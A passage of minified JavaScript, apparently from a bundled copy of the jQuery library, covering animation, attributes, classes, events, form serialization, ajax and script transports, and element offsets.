0!==n?Tt.style(t,e,n):Tt.css(t,e)}),t,e,arguments.length>1)}}),Tt.Tween=W,W.prototype={constructor:W,init:function(t,e,n,i,o,r){this.elem=t,this.prop=n,this.easing=o||Tt.easing._default,this.options=e,this.start=this.now=this.cur(),this.end=i,this.unit=r||(Tt.cssNumber[n]?"":"px")},cur:function(){var t=W.propHooks[this.prop];return t&&t.get?t.get(this):W.propHooks._default.get(this)},run:function(t){var e,n=W.propHooks[this.prop];return this.options.duration?this.pos=e=Tt.easing[this.easing](t,this.options.duration*t,0,1,this.options.duration):this.pos=e=t,this.now=(this.end-this.start)*e+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):W.propHooks._default.set(this),this}},W.prototype.init.prototype=W.prototype,W.propHooks={_default:{get:function(t){var e;return 1!==t.elem.nodeType||null!=t.elem[t.prop]&&null==t.elem.style[t.prop]?t.elem[t.prop]:(e=Tt.css(t.elem,t.prop,""))&&"auto"!==e?e:0},set:function(t){Tt.fx.step[t.prop]?Tt.fx.step[t.prop](t):1!==t.elem.nodeType||!Tt.cssHooks[t.prop]&&null==t.elem.style[R(t.prop)]?t.elem[t.prop]=t.now:Tt.style(t.elem,t.prop,t.now+t.unit)}}},W.propHooks.scrollTop=W.propHooks.scrollLeft={set:function(t){t.elem.nodeType&&t.elem.parentNode&&(t.elem[t.prop]=t.now)}},Tt.easing={linear:function(t){return t},swing:function(t){return.5-Math.cos(t*Math.PI)/2},_default:"swing"},Tt.fx=W.prototype.init,Tt.fx.step={};var je,Ae,Me=/^(?:toggle|show|hide)$/,De=/queueHooks$/;Tt.Animation=Tt.extend(K,{tweeners:{"*":[function(t,e){var n=this.createTween(t,e);return b(n.elem,t,Jt.exec(e),n),n}]},tweener:function(t,e){yt(t)?(e=t,t=["*"]):t=t.match(qt);for(var n,i=0,o=t.length;i<o;i++)n=t[i],K.tweeners[n]=K.tweeners[n]||[],K.tweeners[n].unshift(e)},prefilters:[function Y(t,e,n){var i,o,r,s,a,l,c,u,h="width"in e||"height"in e,d=this,p={},f=t.style,m=t.nodeType&&oe(t),g=Yt.get(t,"fxshow");for(i in n.queue||(null==(s=Tt._queueHooks(t,"fx")).unqueued&&(s.unqueued=0,a=s.empty.fire,s.empty.fire=function(){s.unqueued||a()}),s.unqueued++,d.always((function(){d.always((function(){s.unqueued--,Tt.queue(t,"fx").length||s.empty.fire()}))}))),e)if(o=e[i],Me.test(o)){if(delete e[i],r=r||"toggle"===o,o===(m?"hide":"show")){if("show"!==o||!g||void 0===g[i])continue;m=!0}p[i]=g&&g[i]||Tt.style(t,i)}if((l=!Tt.isEmptyObject(e))||!Tt.isEmptyObject(p))for(i in h&&1===t.nodeType&&(n.overflow=[f.overflow,f.overflowX,f.overflowY],null==(c=g&&g.display)&&(c=Yt.get(t,"display")),"none"===(u=Tt.css(t,"display"))&&(c?u=c:(w([t],!0),c=t.style.display||c,u=Tt.css(t,"display"),w([t]))),("inline"===u||"inline-block"===u&&null!=c)&&"none"===Tt.css(t,"float")&&(l||(d.done((function(){f.display=c})),null==c&&(u=f.display,c="none"===u?"":u)),f.display="inline-block")),n.overflow&&(f.overflow="hidden",d.always((function(){f.overflow=n.overflow[0],f.overflowX=n.overflow[1],f.overflowY=n.overflow[2]}))),l=!1,p)l||(g?"hidden"in g&&(m=g.hidden):g=Yt.access(t,"fxshow",{display:c}),r&&(g.hidden=!m),m&&w([t],!0),d.done((function(){for(i in m||w([t]),Yt.remove(t,"fxshow"),p)Tt.style(t,i,p[i])}))),l=X(m?g[i]:0,i,d),i in g||(g[i]=l.start,m&&(l.end=l.start,l.start=0))}],prefilter:function(t,e){e?K.prefilters.unshift(t):K.prefilters.push(t)}}),Tt.speed=function(t,e,n){var i=t&&"object"==typeof t?Tt.extend({},t):{complete:n||!n&&e||yt(t)&&t,duration:t,easing:n&&e||e&&!yt(e)&&e};return Tt.fx.off?i.duration=0:"number"!=typeof i.duration&&(i.duration in Tt.fx.speeds?i.duration=Tt.fx.speeds[i.duration]:i.duration=Tt.fx.speeds._default),null!=i.queue&&!0!==i.queue||(i.queue="fx"),i.old=i.complete,i.complete=function(){yt(i.old)&&i.old.call(this),i.queue&&Tt.dequeue(this,i.queue)},i},Tt.fn.extend({fadeTo:function(t,e,n,i){return this.filter(oe).css("opacity",0).show().end().animate({opacity:e},t,n,i)},animate:function(t,e,n,i){var o=Tt.isEmptyObject(t),r=Tt.speed(e,n,i),s=function(){var e=K(this,Tt.extend({},t),r);(o||Yt.get(this,"finish"))&&e.stop(!0)};return s.finish=s,o||!1===r.queue?this.each(s):this.queue(r.queue,s)},stop:function(t,e,n){var i=function(t){var e=t.stop;delete t.stop,e(n)};return"string"!=typeof t&&(n=e,e=t,t=void 0),e&&this.queue(t||"fx",[]),this.each((function(){var e=!0,o=null!=t&&t+"queueHooks",r=Tt.timers,s=Yt.get(this);if(o)s[o]&&s[o].stop&&i(s[o]);else for(o in s)s[o]&&s[o].stop&&De.test(o)&&i(s[o]);for(o=r.length;o--;)r[o].elem!==this||null!=t&&r[o].queue!==t||(r[o].anim.stop(n),e=!1,r.splice(o,1));!e&&n||Tt.dequeue(this,t)}))},finish:function(t){return!1!==t&&(t=t||"fx"),this.each((function(){var e,n=Yt.get(this),i=n[t+"queue"],o=n[t+"queueHooks"],r=Tt.timers,s=i?i.length:0;for(n.finish=!0,Tt.queue(this,t,[]),o&&o.stop&&o.stop.call(this,!0),e=r.length;e--;)r[e].elem===this&&r[e].queue===t&&(r[e].anim.stop(!0),r.splice(e,1));for(e=0;e<s;e++)i[e]&&i[e].finish&&i[e].finish.call(this);delete n.finish}))}}),Tt.each(["toggle","show","hide"],(function(t,e){var n=Tt.fn[e];Tt.fn[e]=function(t,i,o){return null==t||"boolean"==typeof t?n.apply(this,arguments):this.animate(U(e,!0),t,i,o)}})),Tt.each({slideDown:U("show"),slideUp:U("hide"),slideToggle:U("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},(function(t,e){Tt.fn[t]=function(t,n,i){return this.animate(e,t,n,i)}})),Tt.timers=[],Tt.fx.tick=function(){var t,e=0,n=Tt.timers;for(je=Date.now();e<n.length;e++)(t=n[e])()||n[e]!==t||n.splice(e--,1);n.length||Tt.fx.stop(),je=void 0},Tt.fx.timer=function(t){Tt.timers.push(t),Tt.fx.start()},Tt.fx.interval=13,Tt.fx.start=function(){Ae||(Ae=!0,z())},Tt.fx.stop=function(){Ae=null},Tt.fx.speeds={slow:600,fast:200,_default:400},Tt.fn.delay=function(e,n){return e=Tt.fx&&Tt.fx.speeds[e]||e,n=n||"fx",this.queue(n,(function(n,i){var o=t.setTimeout(n,e);i.stop=function(){t.clearTimeout(o)}}))},function(){var t=xt.createElement("input"),e=xt.createElement("select").appendChild(xt.createElement("option"));t.type="checkbox",vt.checkOn=""!==t.value,vt.optSelected=e.selected,(t=xt.createElement("input")).value="t",t.type="radio",vt.radioValue="t"===t.value}();var Le,Pe=Tt.expr.attrHandle;Tt.fn.extend({attr:function(t,e){return zt(this,Tt.attr,t,e,arguments.length>1)},removeAttr:function(t){return this.each((function(){Tt.removeAttr(this,t)}))}}),Tt.extend({attr:function(t,e,n){var i,o,r=t.nodeType;if(3!==r&&8!==r&&2!==r)return void 0===t.getAttribute?Tt.prop(t,e,n):(1===r&&Tt.isXMLDoc(t)||(o=Tt.attrHooks[e.toLowerCase()]||(Tt.expr.match.bool.test(e)?Le:void 0)),void 0!==n?null===n?void Tt.removeAttr(t,e):o&&"set"in o&&void 0!==(i=o.set(t,n,e))?i:(t.setAttribute(e,n+""),n):o&&"get"in o&&null!==(i=o.get(t,e))?i:null==(i=Tt.find.attr(t,e))?void 0:i)},attrHooks:{type:{set:function(t,e){if(!vt.radioValue&&"radio"===e&&r(t,"input")){var n=t.value;return t.setAttribute("type",e),n&&(t.value=n),e}}}},removeAttr:function(t,e){var n,i=0,o=e&&e.match(qt);if(o&&1===t.nodeType)for(;n=o[i++];)t.removeAttribute(n)}}),Le={set:function(t,e,n){return!1===e?Tt.removeAttr(t,n):t.setAttribute(n,n),n}},Tt.each(Tt.expr.match.bool.source.match(/\w+/g),(function(t,e){var n=Pe[e]||Tt.find.attr;Pe[e]=function(t,e,i){var o,r,s=e.toLowerCase();return i||(r=Pe[s],Pe[s]=o,o=null!=n(t,e,i)?s:null,Pe[s]=r),o}}));var $e=/^(?:input|select|textarea|button)$/i,Oe=/^(?:a|area)$/i;Tt.fn.extend({prop:function(t,e){return zt(this,Tt.prop,t,e,arguments.length>1)},removeProp:function(t){return this.each((function(){delete this[Tt.propFix[t]||t]}))}}),Tt.extend({prop:function(t,e,n){var i,o,r=t.nodeType;if(3!==r&&8!==r&&2!==r)return 1===r&&Tt.isXMLDoc(t)||(e=Tt.propFix[e]||e,o=Tt.propHooks[e]),void 0!==n?o&&"set"in o&&void 0!==(i=o.set(t,n,e))?i:t[e]=n:o&&"get"in o&&null!==(i=o.get(t,e))?i:t[e]},propHooks:{tabIndex:{get:function(t){var e=Tt.find.attr(t,"tabindex");return e?parseInt(e,10):$e.test(t.nodeName)||Oe.test(t.nodeName)&&t.href?0:-1}}},propFix:{for:"htmlFor",class:"className"}}),vt.optSelected||(Tt.propHooks.selected={get:function(t){var e=t.parentNode;return e&&e.parentNode&&e.parentNode.selectedIndex,null},set:function(t){var e=t.parentNode;e&&(e.selectedIndex,e.parentNode&&e.parentNode.selectedIndex)}}),Tt.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],(function(){Tt.propFix[this.toLowerCase()]=this})),Tt.fn.extend({addClass:function(t){var e,n,i,o,r,s;return yt(t)?this.each((function(e){Tt(this).addClass(t.call(this,e,Z(this)))})):(e=J(t)).length?this.each((function(){if(i=Z(this),n=1===this.nodeType&&" "+G(i)+" "){for(r=0;r<e.length;r++)o=e[r],n.indexOf(" "+o+" ")<0&&(n+=o+" ");s=G(n),i!==s&&this.setAttribute("class",s)}})):this},removeClass:function(t){var e,n,i,o,r,s;return yt(t)?this.each((function(e){Tt(this).removeClass(t.call(this,e,Z(this)))})):arguments.length?(e=J(t)).length?this.each((function(){if(i=Z(this),n=1===this.nodeType&&" "+G(i)+" "){for(r=0;r<e.length;r++)for(o=e[r];n.indexOf(" "+o+" ")>-1;)n=n.replace(" "+o+" "," ");s=G(n),i!==s&&this.setAttribute("class",s)}})):this:this.attr("class","")},toggleClass:function(t,e){var n,i,o,r,s=typeof t,a="string"===s||Array.isArray(t);return yt(t)?this.each((function(n){Tt(this).toggleClass(t.call(this,n,Z(this),e),e)})):"boolean"==typeof e&&a?e?this.addClass(t):this.removeClass(t):(n=J(t),this.each((function(){if(a)for(r=Tt(this),o=0;o<n.length;o++)i=n[o],r.hasClass(i)?r.removeClass(i):r.addClass(i);else void 0!==t&&"boolean"!==s||((i=Z(this))&&Yt.set(this,"__className__",i),this.setAttribute&&this.setAttribute("class",i||!1===t?"":Yt.get(this,"__className__")||""))})))},hasClass:function(t){var e,n,i=0;for(e=" "+t+" ";n=this[i++];)if(1===n.nodeType&&(" "+G(Z(n))+" ").indexOf(e)>-1)return!0;return!1}});var Be=/\r/g;Tt.fn.extend({val:function(t){var e,n,i,o=this[0];return arguments.length?(i=yt(t),this.each((function(n){var o;1===this.nodeType&&(null==(o=i?t.call(this,n,Tt(this).val()):t)?o="":"number"==typeof o?o+="":Array.isArray(o)&&(o=Tt.map(o,(function(t){return null==t?"":t+""}))),(e=Tt.valHooks[this.type]||Tt.valHooks[this.nodeName.toLowerCase()])&&"set"in e&&void 0!==e.set(this,o,"value")||(this.value=o))}))):o?(e=Tt.valHooks[o.type]||Tt.valHooks[o.nodeName.toLowerCase()])&&"get"in e&&void 0!==(n=e.get(o,"value"))?n:"string"==typeof(n=o.value)?n.replace(Be,""):null==n?"":n:void 0}}),Tt.extend({valHooks:{option:{get:function(t){var e=Tt.find.attr(t,"value");return null!=e?e:G(Tt.text(t))}},select:{get:function(t){var e,n,i,o=t.options,s=t.selectedIndex,a="select-one"===t.type,l=a?null:[],c=a?s+1:o.length;for(i=s<0?c:a?s:0;i<c;i++)if(((n=o[i]).selected||i===s)&&!n.disabled&&(!n.parentNode.disabled||!r(n.parentNode,"optgroup"))){if(e=Tt(n).val(),a)return e;l.push(e)}return l},set:function(t,e){for(var n,i,o=t.options,r=Tt.makeArray(e),s=o.length;s--;)((i=o[s]).selected=Tt.inArray(Tt.valHooks.option.get(i),r)>-1)&&(n=!0);return n||(t.selectedIndex=-1),r}}}}),Tt.each(["radio","checkbox"],(function(){Tt.valHooks[this]={set:function(t,e){if(Array.isArray(e))return t.checked=Tt.inArray(Tt(t).val(),e)>-1}},vt.checkOn||(Tt.valHooks[this].get=function(t){return null===t.getAttribute("value")?"on":t.value})}));var Ie=t.location,Ne={guid:Date.now()},Re=/\?/;Tt.parseXML=function(e){var n,i;if(!e||"string"!=typeof e)return null;try{n=(new t.DOMParser).parseFromString(e,"text/xml")}catch(o){}return i=n&&n.getElementsByTagName("parsererror")[0],n&&!i||Tt.error("Invalid XML: "+(i?Tt.map(i.childNodes,(function(t){return t.textContent})).join("\n"):e)),n};var He=/^(?:focusinfocus|focusoutblur)$/,qe=function(t){t.stopPropagation()};Tt.extend(Tt.event,{trigger:function(e,n,i,o){var r,s,a,l,c,u,h,d,p=[i||xt],f=ft.call(e,"type")?e.type:e,m=ft.call(e,"namespace")?e.namespace.split("."):[];if(s=d=a=i=i||xt,3!==i.nodeType&&8!==i.nodeType&&!He.test(f+Tt.event.triggered)&&(f.indexOf(".")>-1&&(f=(m=f.split(".")).shift(),m.sort()),c=f.indexOf(":")<0&&"on"+f,(e=e[Tt.expando]?e:new Tt.Event(f,"object"==typeof e&&e)).isTrigger=o?2:3,e.namespace=m.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+m.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=i),n=null==n?[e]:Tt.makeArray(n,[e]),h=Tt.event.special[f]||{},o||!h.trigger||!1!==h.trigger.apply(i,n))){if(!o&&!h.noBubble&&!bt(i)){for(l=h.delegateType||f,He.test(l+f)||(s=s.parentNode);s;s=s.parentNode)p.push(s),a=s;a===(i.ownerDocument||xt)&&p.push(a.defaultView||a.parentWindow||t)}for(r=0;(s=p[r++])&&!e.isPropagationStopped();)d=s,e.type=r>1?l:h.bindType||f,(u=(Yt.get(s,"events")||Object.create(null))[e.type]&&Yt.get(s,"handle"))&&u.apply(s,n),(u=c&&s[c])&&u.apply&&Xt(s)&&(e.result=u.apply(s,n),!1===e.result&&e.preventDefault());return e.type=f,o||e.isDefaultPrevented()||h._default&&!1!==h._default.apply(p.pop(),n)||!Xt(i)||c&&yt(i[f])&&!bt(i)&&((a=i[c])&&(i[c]=null),Tt.event.triggered=f,e.isPropagationStopped()&&d.addEventListener(f,qe),i[f](),e.isPropagationStopped()&&d.removeEventListener(f,qe),Tt.event.triggered=void 0,a&&(i[c]=a)),e.result}},simulate:function(t,e,n){var i=Tt.extend(new Tt.Event,n,{type:t,isSimulated:!0});Tt.event.trigger(i,null,e)}}),Tt.fn.extend({trigger:function(t,e){return this.each((function(){Tt.event.trigger(t,e,this)}))},triggerHandler:function(t,e){var n=this[0];if(n)return Tt.event.trigger(t,e,n,!0)}});var Fe=/\[\]$/,We=/\r?\n/g,ze=/^(?:submit|button|image|reset|file)$/i,Ve=/^(?:input|select|textarea|keygen)/i;Tt.param=function(t,e){var n,i=[],o=function(t,e){var n=yt(e)?e():e;i[i.length]=encodeURIComponent(t)+"="+encodeURIComponent(null==n?"":n)};if(null==t)return"";if(Array.isArray(t)||t.jquery&&!Tt.isPlainObject(t))Tt.each(t,(function(){o(this.name,this.value)}));else for(n in t)tt(n,t[n],e,o);return i.join("&")},Tt.fn.extend({serialize:function(){return Tt.param(this.serializeArray())},serializeArray:function(){return this.map((function(){var t=Tt.prop(this,"elements");return t?Tt.makeArray(t):this})).filter((function(){var t=this.type;return this.name&&!Tt(this).is(":disabled")&&Ve.test(this.nodeName)&&!ze.test(t)&&(this.checked||!le.test(t))})).map((function(t,e){var n=Tt(this).val();return null==n?null:Array.isArray(n)?Tt.map(n,(function(t){return{name:e.name,value:t.replace(We,"\r\n")}})):{name:e.name,value:n.replace(We,"\r\n")}})).get()}});var Ue=/%20/g,Xe=/#.*$/,Ye=/([?&])_=[^&]*/,Qe=/^(.*?):[ \t]*([^\r\n]*)$/gm,Ge=/^(?:GET|HEAD)$/,Ze=/^\/\//,Je={},tn={},en="*/".concat("*"),nn=xt.createElement("a");nn.href=Ie.href,Tt.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Ie.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Ie.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":en,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":Tt.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(t,e){return e?it(it(t,Tt.ajaxSettings),e):it(Tt.ajaxSettings,t)},ajaxPrefilter:et(Je),ajaxTransport:et(tn),ajax:function(e,n){function i(e,n,i,a){var c,d,p,x,w,_=n;u||(u=!0,l&&t.clearTimeout(l),o=void 0,s=a||"",k.readyState=e>0?4:0,c=e>=200&&e<300||304===e,i&&(x=function ot(t,e,n){for(var i,o,r,s,a=t.contents,l=t.dataTypes;"*"===l[0];)l.shift(),void 0===i&&(i=t.mimeType||e.getResponseHeader("Content-Type"));if(i)for(o in a)if(a[o]&&a[o].test(i)){l.unshift(o);break}if(l[0]in n)r=l[0];else{for(o in n){if(!l[0]||t.converters[o+" "+l[0]]){r=o;break}s||(s=o)}r=r||s}if(r)return r!==l[0]&&l.unshift(r),n[r]}(f,k,i)),!c&&Tt.inArray("script",f.dataTypes)>-1&&Tt.inArray("json",f.dataTypes)<0&&(f.converters["text script"]=function(){}),x=function rt(t,e,n,i){var o,r,s,a,l,c={},u=t.dataTypes.slice();if(u[1])for(s in t.converters)c[s.toLowerCase()]=t.converters[s];for(r=u.shift();r;)if(t.responseFields[r]&&(n[t.responseFields[r]]=e),!l&&i&&t.dataFilter&&(e=t.dataFilter(e,t.dataType)),l=r,r=u.shift())if("*"===r)r=l;else if("*"!==l&&l!==r){if(!(s=c[l+" "+r]||c["* "+r]))for(o in c)if((a=o.split(" "))[1]===r&&(s=c[l+" "+a[0]]||c["* "+a[0]])){!0===s?s=c[o]:!0!==c[o]&&(r=a[0],u.unshift(a[1]));break}if(!0!==s)if(s&&t.throws)e=s(e);else try{e=s(e)}catch(h){return{state:"parsererror",error:s?h:"No conversion from "+l+" to "+r}}}return{state:"success",data:e}}(f,x,k,c),c?(f.ifModified&&((w=k.getResponseHeader("Last-Modified"))&&(Tt.lastModified[r]=w),(w=k.getResponseHeader("etag"))&&(Tt.etag[r]=w)),204===e||"HEAD"===f.type?_="nocontent":304===e?_="notmodified":(_=x.state,d=x.data,c=!(p=x.error))):(p=_,!e&&_||(_="error",e<0&&(e=0))),k.status=e,k.statusText=(n||_)+"",c?v.resolveWith(m,[d,_,k]):v.rejectWith(m,[k,_,p]),k.statusCode(b),b=void 0,h&&g.trigger(c?"ajaxSuccess":"ajaxError",[k,f,c?d:p]),y.fireWith(m,[k,_]),h&&(g.trigger("ajaxComplete",[k,f]),--Tt.active||Tt.event.trigger("ajaxStop")))}"object"==typeof e&&(n=e,e=void 0),n=n||{};var o,r,s,a,l,c,u,h,d,p,f=Tt.ajaxSetup({},n),m=f.context||f,g=f.context&&(m.nodeType||m.jquery)?Tt(m):Tt.event,v=Tt.Deferred(),y=Tt.Callbacks("once memory"),b=f.statusCode||{},x={},w={},_="canceled",k={readyState:0,getResponseHeader:function(t){var e;if(u){if(!a)for(a={};e=Qe.exec(s);)a[e[1].toLowerCase()+" "]=(a[e[1].toLowerCase()+" "]||[]).concat(e[2]);e=a[t.toLowerCase()+" "]}return null==e?null:e.join(", ")},getAllResponseHeaders:function(){return u?s:null},setRequestHeader:function(t,e){return null==u&&(t=w[t.toLowerCase()]=w[t.toLowerCase()]||t,x[t]=e),this},overrideMimeType:function(t){return null==u&&(f.mimeType=t),this},statusCode:function(t){var e;if(t)if(u)k.always(t[k.status]);else for(e in t)b[e]=[b[e],t[e]];return this},abort:function(t){var e=t||_;return o&&o.abort(e),i(0,e),this}};if(v.promise(k),f.url=((e||f.url||Ie.href)+"").replace(Ze,Ie.protocol+"//"),f.type=n.method||n.type||f.method||f.type,f.dataTypes=(f.dataType||"*").toLowerCase().match(qt)||[""],null==f.crossDomain){c=xt.createElement("a");try{c.href=f.url,c.href=c.href,f.crossDomain=nn.protocol+"//"+nn.host!=c.protocol+"//"+c.host}catch(T){f.crossDomain=!0}}if(f.data&&f.processData&&"string"!=typeof f.data&&(f.data=Tt.param(f.data,f.traditional)),nt(Je,f,n,k),u)return k;for(d in(h=Tt.event&&f.global)&&0==Tt.active++&&Tt.event.trigger("ajaxStart"),f.type=f.type.toUpperCase(),f.hasContent=!Ge.test(f.type),r=f.url.replace(Xe,""),f.hasContent?f.data&&f.processData&&0===(f.contentType||"").indexOf("application/x-www-form-urlencoded")&&(f.data=f.data.replace(Ue,"+")):(p=f.url.slice(r.length),f.data&&(f.processData||"string"==typeof f.data)&&(r+=(Re.test(r)?"&":"?")+f.data,delete f.data),!1===f.cache&&(r=r.replace(Ye,"$1"),p=(Re.test(r)?"&":"?")+"_="+Ne.guid+++p),f.url=r+p),f.ifModified&&(Tt.lastModified[r]&&k.setRequestHeader("If-Modified-Since",Tt.lastModified[r]),Tt.etag[r]&&k.setRequestHeader("If-None-Match",Tt.etag[r])),(f.data&&f.hasContent&&!1!==f.contentType||n.contentType)&&k.setRequestHeader("Content-Type",f.contentType),k.setRequestHeader("Accept",f.dataTypes[0]&&f.accepts[f.dataTypes[0]]?f.accepts[f.dataTypes[0]]+("*"!==f.dataTypes[0]?", "+en+"; q=0.01":""):f.accepts["*"]),f.headers)k.setRequestHeader(d,f.headers[d]);if(f.beforeSend&&(!1===f.beforeSend.call(m,k,f)||u))return k.abort();if(_="abort",y.add(f.complete),k.done(f.success),k.fail(f.error),o=nt(tn,f,n,k)){if(k.readyState=1,h&&g.trigger("ajaxSend",[k,f]),u)return k;f.async&&f.timeout>0&&(l=t.setTimeout((function(){k.abort("timeout")}),f.timeout));try{u=!1,o.send(x,i)}catch(T){if(u)throw T;i(-1,T)}}else i(-1,"No Transport");return k},getJSON:function(t,e,n){return Tt.get(t,e,n,"json")},getScript:function(t,e){return Tt.get(t,void 0,e,"script")}}),Tt.each(["get","post"],(function(t,e){Tt[e]=function(t,n,i,o){return yt(n)&&(o=o||i,i=n,n=void 0),Tt.ajax(Tt.extend({url:t,type:e,dataType:o,data:n,success:i},Tt.isPlainObject(t)&&t))}})),Tt.ajaxPrefilter((function(t){var e;for(e in t.headers)"content-type"===e.toLowerCase()&&(t.contentType=t.headers[e]||"")})),Tt._evalUrl=function(t,e,n){return Tt.ajax({url:t,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,converters:{"text script":function(){}},dataFilter:function(t){Tt.globalEval(t,e,n)}})},Tt.fn.extend({wrapAll:function(t){var e;return this[0]&&(yt(t)&&(t=t.call(this[0])),e=Tt(t,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&e.insertBefore(this[0]),e.map((function(){for(var t=this;t.firstElementChild;)t=t.firstElementChild;return t})).append(this)),this},wrapInner:function(t){return yt(t)?this.each((function(e){Tt(this).wrapInner(t.call(this,e))})):this.each((function(){var e=Tt(this),n=e.contents();n.length?n.wrapAll(t):e.append(t)}))},wrap:function(t){var e=yt(t);return this.each((function(n){Tt(this).wrapAll(e?t.call(this,n):t)}))},unwrap:function(t){return this.parent(t).not("body").each((function(){Tt(this).replaceWith(this.childNodes)})),this}}),Tt.expr.pseudos.hidden=function(t){return!Tt.expr.pseudos.visible(t)},Tt.expr.pseudos.visible=function(t){return!!(t.offsetWidth||t.offsetHeight||t.getClientRects().length)},Tt.ajaxSettings.xhr=function(){try{return new t.XMLHttpRequest}catch(e){}};var on={0:200,1223:204},rn=Tt.ajaxSettings.xhr();vt.cors=!!rn&&"withCredentials"in rn,vt.ajax=rn=!!rn,Tt.ajaxTransport((function(e){var n,i;if(vt.cors||rn&&!e.crossDomain)return{send:function(o,r){var s,a=e.xhr();if(a.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(s in e.xhrFields)a[s]=e.xhrFields[s];for(s in e.mimeType&&a.overrideMimeType&&a.overrideMimeType(e.mimeType),e.crossDomain||o["X-Requested-With"]||(o["X-Requested-With"]="XMLHttpRequest"),o)a.setRequestHeader(s,o[s]);n=function(t){return function(){n&&(n=i=a.onload=a.onerror=a.onabort=a.ontimeout=a.onreadystatechange=null,"abort"===t?a.abort():"error"===t?"number"!=typeof a.status?r(0,"error"):r(a.status,a.statusText):r(on[a.status]||a.status,a.statusText,"text"!==(a.responseType||"text")||"string"!=typeof a.responseText?{binary:a.response}:{text:a.responseText},a.getAllResponseHeaders()))}},a.onload=n(),i=a.onerror=a.ontimeout=n("error"),void 0!==a.onabort?a.onabort=i:a.onreadystatechange=function(){4===a.readyState&&t.setTimeout((function(){n&&i()}))},n=n("abort");try{a.send(e.hasContent&&e.data||null)}catch(l){if(n)throw l}},abort:function(){n&&n()}}})),Tt.ajaxPrefilter((function(t){t.crossDomain&&(t.contents.script=!1)})),Tt.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(t){return Tt.globalEval(t),t}}}),Tt.ajaxPrefilter("script",(function(t){void 0===t.cache&&(t.cache=!1),t.crossDomain&&(t.type="GET")})),Tt.ajaxTransport("script",(function(t){var e,n;if(t.crossDomain||t.scriptAttrs)return{send:function(i,o){e=Tt("<script>").attr(t.scriptAttrs||{}).prop({charset:t.scriptCharset,src:t.url}).on("load error",n=function(t){e.remove(),n=null,t&&o("error"===t.type?404:200,t.type)}),xt.head.appendChild(e[0])},abort:function(){n&&n()}}}));var sn,an=[],ln=/(=)\?(?=&|$)|\?\?/;Tt.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var t=an.pop()||Tt.expando+"_"+Ne.guid++;return this[t]=!0,t}}),Tt.ajaxPrefilter("json jsonp",(function(e,n,i){var o,r,s,a=!1!==e.jsonp&&(ln.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&ln.test(e.data)&&"data");if(a||"jsonp"===e.dataTypes[0])return o=e.jsonpCallback=yt(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,a?e[a]=e[a].replace(ln,"$1"+o):!1!==e.jsonp&&(e.url+=(Re.test(e.url)?"&":"?")+e.jsonp+"="+o),e.converters["script json"]=function(){return s||Tt.error(o+" was not called"),s[0]},e.dataTypes[0]="json",r=t[o],t[o]=function(){s=arguments},i.always((function(){void 0===r?Tt(t).removeProp(o):t[o]=r,e[o]&&(e.jsonpCallback=n.jsonpCallback,an.push(o)),s&&yt(r)&&r(s[0]),s=r=void 0})),"script"})),vt.createHTMLDocument=((sn=xt.implementation.createHTMLDocument("").body).innerHTML="<form></form><form></form>",2===sn.childNodes.length),Tt.parseHTML=function(t,e,n){return"string"!=typeof t?[]:("boolean"==typeof e&&(n=e,e=!1),e||(vt.createHTMLDocument?((i=(e=xt.implementation.createHTMLDocument("")).createElement("base")).href=xt.location.href,e.head.appendChild(i)):e=xt),r=!n&&[],(o=Bt.exec(t))?[e.createElement(o[1])]:(o=T([t],e,r),r&&r.length&&Tt(r).remove(),Tt.merge([],o.childNodes)));var i,o,r},Tt.fn.load=function(t,e,n){var i,o,r,s=this,a=t.indexOf(" ");return a>-1&&(i=G(t.slice(a)),t=t.slice(0,a)),yt(e)?(n=e,e=void 0):e&&"object"==typeof e&&(o="POST"),s.length>0&&Tt.ajax({url:t,type:o||"GET",dataType:"html",data:e}).done((function(t){r=arguments,s.html(i?Tt("<div>").append(Tt.parseHTML(t)).find(i):t)})).always(n&&function(t,e){s.each((function(){n.apply(this,r||[t.responseText,e,t])}))}),this},Tt.expr.pseudos.animated=function(t){return Tt.grep(Tt.timers,(function(e){return t===e.elem})).length},Tt.offset={setOffset:function(t,e,n){var i,o,r,s,a,l,c=Tt.css(t,"position"),u=Tt(t),h={};"static"===c&&(t.style.position="relative"),a=u.offset(),r=Tt.css(t,"top"),l=Tt.css(t,"left"),("absolute"===c||"fixed"===c)&&(r+l).indexOf("auto")>-1?(s=(i=u.position()).top,o=i.left):(s=parseFloat(r)||0,o=parseFloat(l)||0),yt(e)&&(e=e.call(t,n,Tt.extend({},a))),null!=e.top&&(h.top=e.top-a.top+s),null!=e.left&&(h.left=e.left-a.left+o),"using"in e?e.using.call(t,h):u.css(h)}},Tt.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each((function(e){Tt.offset.setOffset(this,t,e)}));var e,n,i=this[0];return i?i.getClientRects().length?(e=i.getBoundingClientRect(),n=i.ownerDocument.defaultView,{top:e.top+n.pageYOffset,left:e.left+n.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var 